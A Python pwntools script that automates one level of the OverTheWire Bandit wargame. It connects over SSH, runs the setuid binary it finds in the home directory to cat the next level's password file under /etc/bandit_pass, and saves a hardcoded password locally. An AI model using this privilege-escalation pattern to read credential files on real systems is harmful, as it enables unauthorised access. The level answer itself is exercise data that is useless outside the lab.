import os
import pwn

from tqdm import tqdm

pwn.context.log_level = "WARNING"

n = os.path.basename(__file__)
n = n.split(".")[0]
n = n[n.find("bandit")+6:]
n = int(n)

username = f"bandit{n}"
hostname = "bandit.labs.overthewire.org"
password = None

with open(f"./bandit/password/{username}-password.txt") as f:
    password = f.read()

print(f"Connecting to {hostname}:2220")
print(f"Username : {username}")
print(f"Password : {password}")
print() 

connect = pwn.ssh(host=hostname, user=username, password=password, port=2220)

def send_command(command: list[str], connect: pwn.ssh = connect) -> pwn.tubes.ssh.ssh_channel:
    command = map(str, command)
    command = " ".join(command)
    
    print(f"Sending process : `{command}`", end="...")
    channel = connect.system(command)
    print("Done")
    
    print()

    return channel

def connect_remote(host: str = "127.0.0.1", port: int = 8000, timeout: int = None, connect: pwn.ssh = connect) -> pwn.tubes.ssh.ssh_connecter:
    print(f"Connecting to {host}:{port}", end="...")
    remote = connect.connect_remote(host, port, timeout=timeout)
    print("Done")

    print()

    return remote

def send_lines_remote(lines: list[str] | list[bytes], remote: pwn.tubes.ssh.ssh_connecter) -> None:
    if type(lines[0]) == str:
        lines = [s.encode() for s in lines]

    print(f"Sending {len(lines)} lines", end="...")
    remote.sendlines(lines)
    print("Done")

    print()

def receive_output(channel: pwn.tubes.ssh.ssh_channel | pwn.tubes.ssh.ssh_connecter, lines: int = None) -> str:
    output = None
    
    print("Receiving output", end="...")
    try:
        if not lines:
            output = channel.recv()
        else:
            output = b""

            for _ in range(lines):
                output += channel.recvline()

        output = output.decode()

        output = output.strip()
        output = output.strip("\n")
        print("Done")

        print(output)

    except EOFError:
        if not output:
            print("No output received")
        else:
            print(output.decode())

    except Exception as e:
        print(e)

    print()
    
    if type(output) == bytes:
        output = output.decode()

    return output

if connect.connected():
    channel = send_command(["ls"])
    file = receive_output(channel)

    channel = send_command([f"./{file}"])
    result = receive_output(channel)

    channel = send_command([f"./{file}", "cat", f"/etc/bandit_pass/bandit{n+1}"])
    result = receive_output(channel)

    connect.close()

result = "YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS"

with open(f"./bandit/password/bandit{int(n)+1}-password.txt", "w+") as f:
    f.write(result)